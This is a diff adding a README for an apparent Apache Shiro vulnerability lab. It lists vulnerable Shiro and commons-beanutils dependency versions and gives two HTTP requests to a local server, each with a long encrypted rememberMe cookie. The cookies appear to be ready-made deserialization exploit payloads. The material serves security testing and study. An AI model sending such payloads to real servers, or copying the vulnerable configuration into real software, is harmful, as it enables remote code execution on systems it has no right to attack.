@@ -1,0 +1,59 @@
+# ShiroVulnEnv
+
+## Shiro 1.2.4 (AES-CBC)
+
+```xml
+    <dependency>
+      <groupId>org.apache.shiro</groupId>
+      <artifactId>shiro-core</artifactId>
+      <version>1.2.4</version>
+    </dependency>
+    <dependency>
+      <groupId>org.apache.shiro</groupId>
+      <artifactId>shiro-web</artifactId>
+      <version>1.2.4</version>
+    </dependency>
+    <dependency>
+      <groupId>commons-beanutils</groupId>
+      <artifactId>commons-beanutils</artifactId>
+      <version>1.8.3</version>
+    </dependency>
+```
+
+```http request
+GET /login.jsp HTTP/1.1
+Host: 127.0.0.1:8089
+Cookie: rememberMe=43W6haDnpy4bWymCi14q8VbWRQzVdkmKgFWi3NriOIlNsLAa6ddhiOLeY4KRjn4LDcd5YRMp41Assh6lvWhpkuMTz7Sd6aJ4uuOtM2UR11kksQWYS+EWC3fV89S6GvuQur/eCr57fdrVdxL3PfD2I1dNvPaiH8YJZJzpYF71h3nUq1l5X9I6gucFyqKaPL6nVUYtGMCT8szito5BDgFYORAjN/xV3GO7u4097dsIXt7ONJO84wYwz7CmTwu6bxkHYr7Z+D5DzxTOZwMpQ7wlwkA2OFZ7eD+WFkzFMjucaJS2qEGLS4luXzyEMpX0lIXHcsprpipZYPbDN/SZ2CJMFYsEKT5/uwMaUyoBYhPk1QIrOHd7TwOQ0G7cuwiesXOBje6DtYBXng+an9VsCAUT0mzawjRxqT9nvWLzlBcuvTsXtkYM33/s77DjA2Z5M53/m05cNgp5gQzoQux8M8SGyuliO3aRKeLc7nvgfjy8svrVl/UtcB47xy4xWCfXAst02gfusbvMFiXzidNos/+D4/Ab/mB22stFm/IqDiH/Kj8Gh2Xk0fKlfrIbe4uCk0EgJmum6VJGo/v1HRAAMqoCQqMqXR0rR5IvGjv18mNElc9bJsnmqMMK47aBX4zYPaToa9EexFJLmNCU9oK22NWqJtW0KuOXd7bLCOCaM90zcfTOP330ymdLupjwERidLTuU2AJ6Dm8n4mBGJCwkUDXTMan6wNXehfbdujHGedSrpyjEdU065CEGL8ptwDEpr2heLF791wItRJofP09Q/r1cOD3Kk3cOogpMr3cucIM+YK3uXH3gal7tFokh28VVGAEICT3VV8qcajdbzLHI/LtH7X+eUJTIP2O94yvZum5h083TZlfwbTSAL9nTXYcKKX5GhxY8wBHvTAe3TFvYUGo2r1i8kEt4354H8ydnUEZhU2jI4n+zEe1rEjTkZDyZiCUKMB+xdIzlRLdOl8SN5WNUwos8Yv4zKiwyr5MZ26gcGeQoaUO7JKRaLJOA58rNVaoZvZhlMp/xVMoTp1pfIofHB4MNG9rCwCwwYO9vuUHJX0d1I9PHUFWgTjLB/w25eKjHmdEOE2rGJqcReYpGb0/yNDeHKe0LghP/0r2zsKiC91H4SKrV0pkixtum9HV++TbpPff8fvVLpFFbvcT9uvA82FkAljkvVK3SMO53Qo+Iful4AMyfuIUVzSLsqObOdluhoMgc+vgYjUgIQ9MzsK2FSPGAcDhQSQQ6GKviTkY9+sMXy/tJKHKjZBMTvClqBlsBR0CzSqfT8bmZx8vtmxyJd7oZER7zSAGj1AVisZ+c81zuTV3fGAbAjt9mm6F/f9HBcB/kbvsAibYih7lxBm26vX2s0jjlpQml8nQR3kBDMT5umjN2baeiRO2BwPpGnLznMoGREetY3OVLNazLyZtWIcpMQFW4AM2tU96DR1qFNnUcS1bvC8z7k7xb/oX85qNom8g6fDHGVTeefmA9NsjpcneF3uPe7cjU1wj6PLz2BPKprTZwUCKBPH6DxJQ0LfsojR4jObmSSkwStMXlju8OGvO6RNDueNhWDAFENLs2ogywRMjOJSRMvRNw2k74Avz0URjztO/hOXZhzgayf/Svlc8TWREmv2cbQodhxoIODgOD0rE3Z4QHPbq+XE3v9p8sH3vuDSCCRzVeltlxLOiULnlmtXeB7ALap1IKiBC0nZfN6yY+kzhXtTFJnOZMkk75+wdmOiAuK+pboFn1F5HL1o4knjMSTrD8mik+ml96YVVqbG5EGwO2qlhGumaLgVAw7aO0G4Ib/yuEEUUVdklZzL7TlhamlqUbcCyiLUAmi24l5U03zhP+gcU9bCw7BbpEElYTi+1wlvO7bNRoAIff5QyU/tArji05r9K3NU0zRuKbc/92Sh3Qo2aKRwl25qqER5dYXonVhTallWEhNUYrdaAWyhVfCgkez+2O/bDD16pe+KcioVYEMSp3l5AjvNAJ7Y1GS53VJq8T5+FOyuaZf7oQ5hvmtVVOG33RyyIca9fOvuKlQE/g16m/kWwSLvZlI1rDoIV/HyrNdDNxldiSdEeiEC05FUG7LOkNqtTNticK9mLCw7EjFZaBWQ5fhN31RcRw4+qsGEBtCZycN57+JLSmROuSXvVNQBUoxX0Bvr0Osih4EQRP9S0TKTejAPtaRK2oAYYgcdu8tapKbm9fHXKX6iFqLzxZXqpzWrmmY/rE2Yb60Ue10fudlz+nVqRpH+DgqwL1bBAMEDc72ByDNMigL0RS8HXsGpA8oQmNMME6QolMzOXmuJVB/psVxKHMpCODDOzsQJZzbo9O3pKt8wLSV+o7q6tTAcxlaijGsNf6jPqg5dYKG/+pqcnhRQ7MGNuo0NiLcuMJ8alWgtV3T5KCWUl/T+cByTvEoIXJziOr4gGX4uAHfYIvA6se+z8g1IfpHCQcuqBIj2xcD4zLcYrP3l5fj9HpJcWW7z0ckKARRPN0PGtNyRbDy2nGXPPtgWU2kTMU+uPB1zPDd8cfBOo9YUel3CabcKtlZXVksaRDLCjAvggDxxaxxyDYVG7+wT3sBMtgJWP9MhxoE3I5kJNN5EFMhm0s/Hk2+CC1y632+Z2KyDCUZKnnDXi+t3R+
+
+
+```
+
+## 切换版本，需执行`mvn clean`
+
+## Shiro 1.4.2 (AES-GCM)
+
+```xml
+    <dependency>
+      <groupId>org.apache.shiro</groupId>
+      <artifactId>shiro-core</artifactId>
+      <version>1.4.2</version>
+    </dependency>
+    <dependency>
+      <groupId>org.apache.shiro</groupId>
+      <artifactId>shiro-web</artifactId>
+      <version>1.4.2</version>
+    </dependency>
+    <dependency>
+      <groupId>commons-beanutils</groupId>
+      <artifactId>commons-beanutils</artifactId>
+      <version>1.9.4</version>
+    </dependency>
+```
+
+```http request
+GET /login.jsp HTTP/1.1
+Host: 127.0.0.1:8089
+Cookie: rememberMe=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
+
+
+```
